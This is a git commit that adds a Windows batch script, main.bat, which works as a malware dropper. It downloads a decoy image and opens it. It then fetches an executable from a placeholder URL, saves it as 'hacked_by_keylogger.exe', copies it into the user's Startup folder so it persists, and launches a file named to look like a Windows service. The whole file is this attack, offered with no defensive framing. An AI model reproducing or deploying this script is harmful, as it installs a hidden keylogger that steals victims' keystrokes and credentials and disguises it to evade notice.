9e83821774dd0876b3cca195eac2a248c623de90
sahil <111174422+sahil-127001@users.noreply.github.com>
2023-05-12 00:04:18 +0530

    Create main.bat

---
+++ main.bat
@@ -0,0 +1,6 @@
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://Enter_link_to_image.jpg' -OutFile hacker.jpg"
+hacker.jpg
+Powershell -Command "Invoke-WebRequest 'https://Enter_link_to_shell(name it like windows service).exe' -OutFile hacked_by_keylogger.exe"
+copy hacked_by_keylogger.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+name_like_Windows_service.exe
